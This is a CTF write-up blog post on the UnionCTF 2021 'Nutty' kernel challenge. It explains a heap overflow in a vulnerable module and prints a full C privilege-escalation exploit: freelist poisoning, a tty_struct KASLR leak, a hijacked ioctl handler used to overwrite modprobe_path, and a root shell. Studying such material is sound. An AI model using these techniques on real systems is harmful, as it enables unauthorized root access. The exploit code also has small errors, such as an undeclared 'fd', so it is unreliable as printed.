---
layout: post
title:  "UnionCTF 2021 Nutty"
date:   2021-02-26 00:42:22 +0100
categories: jekyll update
---
Nutty was a kernel pwn challenge of the UnionCTF 2021. I did not manage to solve the challenge during the CTF but solved it
afterwards with some help of other solutions.

## Reconnaissance
We are given a kernel `bzImage`, an `initramfs.cpio` and some files related to Docker and QEMU.
Upon unpacking the initramfs.cpio we discover a `vulnmod.c` file.
Furthermore we discover a `flag.txt` file in the root directory.

Since this is a kernel pwn challenge our goal is clear: Exploit the kernel module to gain root and read the flag.

## Additional info
Checking the `start.sh` file we can see that `KASLR`, `SMEP` and `SMAP` are enabled. Furthermore, the kernel uses the `SLUB` implementation of the Slab allocator.

## Module code
{% highlight c %}
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/miscdevice.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/types.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("p4wn");
MODULE_DESCRIPTION("nutty module");

struct nut {
    u64 size;
    char* contents;
};

typedef struct req {
    int idx;
    int size;
    char* contents;
    int content_length;
    char* show_buffer;
} req;

static struct nut nuts[10];

static int read_idx(req* arg){
    return arg->idx;
}

static int memcpy_safe(void* dst, void* src, int size){
    size = size & 0x3ff;
    return memcpy(dst, src, size);
}

static char* read_contents(req* arg){
    char* to_read = (char*) arg->contents;
    int content_length = arg->content_length;
    if (content_length <= 0){
        printk(KERN_INFO "bad content length");
        return 0;
    }
    // kmalloc can return NULL, results in crash
    char* res = kmalloc(content_length, GFP_KERNEL);
    copy_from_user(res, to_read, content_length);
    return res;
}

static int read_size(req* arg){
    int size = arg->size;
    if (size < 0 || size >= 1024){
        printk(KERN_INFO "invalid size");
        return -EOVERFLOW;
    }
    return size;
}

static int create(req* arg){
    int size = read_size(arg);
    char* contents = read_contents(arg);
    int i;

    for (i = 0; i < 10; i++){
        if (nuts[i].contents == NULL){
            break;
        }
    }

    if (i == 10){
        printk(KERN_INFO "creation error");
        return -EINVAL;
    }

    if (size < 0 || size >= 1024){
        printk(KERN_INFO "bad size");
        return -EINVAL;
    }
    nuts[i].size = size;
    nuts[i].contents = kmalloc(size, GFP_KERNEL);
    if (contents != 0){
        memcpy_safe(nuts[i].contents, contents, size);
        kfree(contents);
    }
    else {
        printk("bad content length!");
        return -EINVAL;
    }

    return 0;
}

static int delete(req* arg){
    int idx = read_idx(arg);
    if (idx < 0 || idx >= 10){
        return -EINVAL;
    }
    if (nuts[idx].contents == NULL){
        return -EINVAL;
    }
    printk(KERN_INFO "deleting at 0x%px", nuts[idx].contents);
    kfree(nuts[idx].contents);
    nuts[idx].contents = NULL;
    nuts[idx].size = 0;

    return 0;
}

static int show(req* arg){
    int idx = read_idx(arg);
    if (idx < 0 || idx >= 10){
        return -EINVAL;
    }
    if (nuts[idx].contents == NULL){
        return -EINVAL;
    }
    copy_to_user(arg->show_buffer, nuts[idx].contents, nuts[idx].size);

    return 0;
}

static int append(req* arg){
    int idx = read_idx(arg);
    if (idx < 0 || idx >= 10){
        return -EINVAL;
    }
    if (nuts[idx].contents == NULL){
        return -EINVAL;
    }

    int new_size = read_size(arg) + nuts[idx].size;
    if (new_size < 0 || new_size >= 1024){
        printk(KERN_INFO "bad new size!\n");
        return -EINVAL;
    }
    char* tmp = kmalloc(new_size, GFP_KERNEL);
    memcpy_safe(tmp, nuts[idx].contents, nuts[idx].size);
    kfree(nuts[idx].contents);
    char* appended = read_contents(arg);
    if (appended != 0){
        memcpy_safe(tmp+nuts[idx].size, appended, new_size - nuts[idx].size);
        kfree(appended);
    }
    nuts[idx].contents = tmp;
    nuts[idx].size = new_size;

    return 0;
}

static long handle_ioctl(struct file *f, unsigned int cmd, unsigned long arg){
    long ret;

    req* args = kmalloc(sizeof(req), GFP_KERNEL);
    copy_from_user(args, arg, sizeof(req));


    if (cmd == 0x13371){
        ret = create(args);
    }
    else if (cmd == 0x13372){
        ret = delete(args);
    }
    else if (cmd == 0x13373){
        ret = show(args);
    }
    else if (cmd == 0x13374){
        ret = append(args);
    }
    else{
        ret = -EINVAL;
    }
    return ret;
}

static const struct file_operations file_ops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = handle_ioctl,
};

static struct miscdevice nutty_device = {
    MISC_DYNAMIC_MINOR, "nutty" , &file_ops
};


static int __init mod_init(void)
{
    int ret;
    printk(KERN_INFO "Initialise module.\n");
    ret = misc_register(&nutty_device);
    return 0;
}

static void __exit mod_cleanup(void)
{
    printk(KERN_INFO "Clean up module.\n");
    misc_deregister(&nutty_device);
}


module_init(mod_init);
module_exit(mod_cleanup);
{% endhighlight %}

## Reversing
Basically the kernel module lets us create content which we can view, edit and delete.
We can communicate with the kernel module using the `ioctl` syscall and the `req` structure the module uses.
The module uses a data structure called `nut` which holds a pointer to our content and its size.
The content is allocated using `kmalloc`.
We are allowed to create a maximum of 10 nuts and the content buffer has to be <= 1023 bytes.

## Vulnerability
There are two vulnerabilities that I noticed:

1. The kernel module does not use any locks. This enables us to create a race condition.
2. A heap overflow.

I tried to use the race condition at first but gave up and decided to go for the heap overflow because the race condition was quite unstable.

## Heap overflow
The Heap overflow is in the `append` function.

{% highlight c %}
static int memcpy_safe(void* dst, void* src, int size){
    size = size & 0x3ff;
    return memcpy(dst, src, size);
}

static int read_size(req* arg){
    int size = arg->size;
    if (size < 0 || size >= 1024){
        printk(KERN_INFO "invalid size");
        return -EOVERFLOW;
    }
    return size;
}

static int append(req* arg) {
    ...

    int new_size = read_size(arg) + nuts[idx].size;
    if (new_size < 0 || new_size >= 1024){
        printk(KERN_INFO "bad new size!\n");
        return -EINVAL;
    }
    char* tmp = kmalloc(new_size, GFP_KERNEL);
    memcpy_safe(tmp, nuts[idx].contents, nuts[idx].size);
    kfree(nuts[idx].contents);
    char* appended = read_contents(arg);
    if (appended != 0){
        memcpy_safe(tmp+nuts[idx].size, appended, new_size - nuts[idx].size);
        kfree(appended);
    }

    ...
}
{% endhighlight %}

The bug is that the return value of `read_size` is used to calculate `new_size`.
This works for all cases where size is in the range of 0 - 1023. If we provide a value > 1023 however,
-EOVERFLOW is returned (which is -112).

Consider following example: We have created a `nut` with size 1023 and are now calling `append` with
a size of 4096. `read_size` will return -112, so `new_size = -112 + 1023 = 911`.
Further below the module calls `memcpy_safe` and passes `new_size - nuts[idx].size = -112` as size parameter to memcpy safe.

`memcpy_safe` then calculates `size & 0x3ff`. Since size is -112, `memcpy_safe` will use 912 (-112 & 0x3ff) as size.
Therefore the call to `memcpy_safe` looks like this: `memcpy_safe(tmp + 1023, appended, 912)`. This is a heap overflow of 912 bytes.

## Exploiting
With this Heap overflow our goal is to somehow poison the Kernel Heap and overwrite stuff in kernel space to gain root.
As I mentioned earlier the given kernel uses the `SLUB` implementation of the Slab allocator. For a good introduction to the Slab allocator in the Linux kernel refer to [this](https://hammertux.github.io/slab-allocator) article.

`SLUB` uses a so called `freelist`, which is a singly linked list of available slabs, to keep track of freed objects. Since we have a heap overflow we can corrupt the freelist in order to get a slab at a chosen address. This attack is similar to Tcache poisoning. The question remaining is: which address should we use ?

This is where I got stuck. Due to SMEP we can't jump to userspace. Being fairly new to kernel pwn, the only privesc technique I have used before in this case is overwriting `modprobe_path`. I managed to successfully forge a `freelist` pointer and also overwrite `modeprobe_path` but the kernel kept crashing. I don't really know why but probably because I messed up the heap too much.

Looking at other solutions I saw that [r4j0x00](https://twitter.com/r4j0x00?lang=en) from SuperGuesser also overwrote `modprobe_path` but used a different way to do so based on the `tty_struct`.

The `tty_struct` is a kernel structure that gets allocated when we call open on `/dev/ptmx` which returns a file descriptor to a pseudoterminal master.
The `tty_struct` can be used to defeat KASLR as well as execute arbitrary code in kernel space. To do so we must overwrite the `tty_operations` pointer of the `tty_struct`. The `tty_operations` is a structure containing a bunch of function callbacks set by a tty driver. Examples are `write` or `ioctl`.

{% highlight c %}
struct tty_struct {
	...

	const struct tty_operations *ops;

    ...

} __randomize_layout;

struct tty_operations {
	...
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);

    ...

} __randomize_layout;

{% endhighlight %}

Looking for ways on how exactly to do this, I found [this](https://pr0cf5.github.io/ctf/2020/03/09/the-plight-of-tty-in-the-linux-kernel.html) article mentioning that we can overwrite the `ioctl`
handler with a gadget like:

{% highlight nasm %}
mov    DWORD PTR [rdx],esi
{% endhighlight %}

As can be seen above, the `ioctl` handler takes 3 arguments. `cmd` and `arg` are user controlled. Therefore when overwriting the `ioctl` handler with this gadget we have a 4 byte arbitrary write primitive to where `rdx` is pointing to. Using ROPGadget I found the gadget at offset `0xdc749` from kernel base.

Lets put everything together.

**Defeating KASLR**

The kernel module uses `kmalloc` to allocate slabs that hold our data. Due to `kmalloc` the contents of a slab are not zeroed out. Therefore to leak the contents of a `tty_struct` we simply open `/dev/ptmx` and immediately close it again so that the `freelist` of the `kmalloc-512` cache contains the now freed `tty_struct`. Allocating a nut with size > 512 will return this chunk to us. We just have to set the size of the `req` struct to 0 in order to not overwrite the chunk.

With the leaked `tty_struct` we have defeated KASLR. Furthermore, the `tty_struct` contains heap pointers which we will use to forge a `freelist` pointer.

**Overwriting modeprobe_path**

To overwrite `modeprobe_path` based on corrupting `tty_operations` we call open on `/dev/ptmx` once again and overflow the heap with the heap address of the `tty_struct` of this pseudoterminal master. We calculate the heap address based on the heap leak we got from the `tty_struct`.

After corrupting the freelist we allocate a bunch more nuts until we get our forged slab which overlaps with the `tty_struct` of the pseudoterminal. Having an overlapping slab, we overwrite the `tty_operations` pointer to point to a forged struct.

Having done this we can simply use the `icotl` syscall and overwrite `modeprobe_path` based on the gadget we have overwritten the `ioctl` handler with.

Overwriting `modeprobe_path` this way does not make the kernel crash. Why ? Idk but probably because we corrupted the freelist with a pointer that is actually on the heap and not somewhere else like the address of `modeprobe_path`.


## Exploit

If you want to try yourself refer to my [repo](https://github.com/h0ps-ctf/Ctf-Challenges) where I uploaded the challenges files, my exploit and some helper scripts.

{% highlight c %}
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>

#define CREATE 0x13371
#define DELETE 0x13372
#define SHOW   0x13373
#define APPEND 0x13374

typedef struct req {
    int idx;
    int size;
    char* contents;
    int content_length;
    char* show_buffer;
} req;

typedef struct nut {
    uint64_t size;
    char* contents;
} nut;

static void print_hex8(char* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static void create(int fd, char* buf,size_t len, size_t cont_len)
{
    req r;

    r.contents = buf;
    r.size = len;
    r.content_length = cont_len;

    if (ioctl(fd, CREATE, &r) == -1) {
        perror("ioctl create");
    }
}

static void delete(int fd, int idx)
{
    req r;
    r.idx = idx;

    if (ioctl(fd, DELETE, &r) == -1) {
        perror("ioctl delete");
    }
}

static void show(int fd, int idx, char* buf)
{
    req r;
    r.idx = idx;
    r.show_buffer = buf;

    if (ioctl(fd, SHOW, &r) == -1) {
        perror("ioctl show");
    }
}

static void append(int fd, int idx, char* buf,size_t len, size_t cont_len)
{
    req r;
    r.idx = idx;
    r.contents = buf;
    r.size = len;
    r.content_length = cont_len;

    if (ioctl(fd, APPEND, &r) == -1) {
        perror("ioctl append");
    }
}

void shell() {
    system("echo '#!/bin/sh' > /home/user/hax; echo 'setsid cttyhack setuidgid 0 \
           /bin/sh' >> /home/user/hax");
    system("chmod +x /home/user/hax");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/roooot");
    system("chmod +x /home/user/roooot");
    system("/home/user/roooot");
}

#define TTY_OPS 0x1064f00
#define MODEPROBE_PATH 0x144cd40
/*
    0xffffffffbd8dc749:	mov    DWORD PTR [rdx],esi
    0xffffffffbd8dc74b:	ret
*/
#define GADGET 0xdc749

#define TTY_STRUCT 56;

// size <= 1024, amount <= 10
int main (void)
{
    fd = open("/dev/nutty", O_RDONLY);

    if (fd < 0) {
        perror("open");
    }

    int tty_fds[0x2];

    for (int i = 0; i < 0x2; i++) {
        tty_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    }
    for (int i = 0; i < 0x2; i++) {
        close(tty_fds[i]);
    }

    char buf[0x400];
    uint64_t* p_buf = (uint64_t*)buf;

    create(fd, buf, 0x3ff, 0);
    show(fd, 0, buf);
    delete(fd, 0);

    char poisoned[0x400];
    memcpy(poisoned, buf, sizeof(buf));

    const uint64_t kernel_base = p_buf[3] - TTY_OPS;
    const uint64_t heap_leak = p_buf[7];
    const uint64_t tty_struct = heap_leak - TTY_STRUCT;
    const uint64_t modeprobe_path = kernel_base + MODEPROBE_PATH;
    const uint64_t gadget = kernel_base + GADGET;

    printf("Kernel base: %p \n", kernel_base);
    printf("Heap leak: %p \n", heap_leak);
    printf("Tty struct: %p \n", tty_struct);
    printf("Modeprobe path: %p \n", modeprobe_path);
    printf("Gadget: %p \n", gadget);

    for (int i = 0; i < (0x400-8) / 0x8; i++) {
        p_buf[i] = tty_struct;
    }

    // victim
    tty_fds[0] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    // shuffle stuff for heap overflow && fd freelist pointer corruption
    for (int i = 0; i < 0xa; i++) {
        create(fd, "AAAAAAAAAAAAAAAA", 0x300, 0x10);
    }

    for (int i = 0; i < 0x8; i++) {
        if (i % 2 == 0) {
            delete(fd, i);
        }
    }

    for (int i = 0; i < 0x8; i++) {
        if (i % 2 != 0) {
            append(fd, i, buf, 0x10000, sizeof(buf));
        }
    }

    for (int i = 0; i < 0x1; i++) {
        create(fd, "AAAAAAAAAAAAAAAA", 0x300, 0x10);
    }

    p_buf = (uint64_t*)poisoned;
    p_buf[0] = 0x100005401;
    // tty struct is about 0x2e0 bytes. Put fake tty_ops somewhere after
    p_buf[3] = tty_struct + (8 * 0x64);

    // fake ioctl fp
    p_buf[0x64 + 12] = gadget;

    create(fd, poisoned, 0x3ff, 0x3ff);

    ioctl(tty_fds[0], 0x6d6f682f, modeprobe_path);
    ioctl(tty_fds[0], 0x73752f65, modeprobe_path + 4);
    ioctl(tty_fds[0], 0x682f7265, modeprobe_path + 8);
    ioctl(tty_fds[0], 0x007861, modeprobe_path + 12);

    puts("Triggering shell");

    shell();
}
{% endhighlight %}